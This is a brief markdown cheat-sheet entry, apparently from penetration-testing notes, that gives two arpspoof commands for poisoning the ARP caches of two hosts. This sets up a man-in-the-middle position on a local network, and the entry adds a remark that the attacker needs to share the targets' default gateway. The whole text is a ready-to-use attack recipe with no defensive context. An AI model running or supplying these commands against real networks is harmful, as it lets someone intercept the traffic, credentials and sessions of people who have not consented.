# Establish MitM
```bash
# Ensure IP Forwarding is enabled

# Shell # 1 - Spoof Host B
sudo arpspoof -i <Interface Name> -t <Target IP Address Host A> <IP Address to Impersonate Host B>
# Shell # 2 - Spoof Host A
sudo arpspoof -i <Interface Name> -t <Target IP Address Host B> <IP Address to Impersonate Host A>
```

### Note: In order to be able to sniff packets using arpspoof, you will need to use the same default gateway used by your targets.